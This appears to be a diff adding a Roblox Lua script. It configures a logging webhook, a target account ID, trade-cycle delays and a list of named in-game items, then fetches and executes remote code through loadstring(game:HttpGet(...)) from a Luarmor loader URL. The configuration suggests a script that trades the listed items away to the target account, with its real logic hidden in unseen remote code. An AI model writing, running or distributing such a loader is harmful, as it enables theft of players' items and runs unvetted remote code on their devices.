@@ -1,0 +1,11 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_9e455ac130d947ab88ed31eb5ff264c4"
+getgenv().TARGET_ID = 9960979506
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Cooki and Milki"] = true,
+    ["Garama and Madundung"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
